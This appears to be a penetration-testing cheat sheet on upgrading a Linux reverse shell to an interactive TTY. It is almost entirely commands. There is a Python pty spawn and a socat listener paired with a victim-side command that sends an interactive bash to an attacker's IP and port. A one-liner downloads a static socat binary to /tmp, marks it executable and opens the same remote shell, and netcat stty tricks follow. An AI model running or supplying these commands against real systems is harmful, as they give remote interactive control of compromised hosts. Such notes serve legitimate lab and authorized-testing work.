# Upgrade a RevShell Linux

## With python
```bash
python -c 'import pty; pty.spawn("/bin/sh")' 
```

## With Socat
    
```bash
#Listener:
socat file:`tty`,raw,echo=0 tcp-listen:<port>

#Victim:
socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:<ip>:<port>
```

[If Socat isn't installed stdn binaries](https://github.com/andrew-d/static-binaries)
```bash
wget -q https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64/socat -O /tmp/socat; chmod +x /tmp/socat; /tmp/socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:<ip>:<port>

```

## With Netcat w/ magic
```bash
# In reverse shell
$ python -c 'import pty; pty.spawn("/bin/bash")'
Ctrl-Z

# In Kali
$ stty raw -echo
$ fg

# In reverse shell
$ reset
$ export SHELL=bash
$ export TERM=xterm-256color
$ stty rows <num> columns <cols>
```
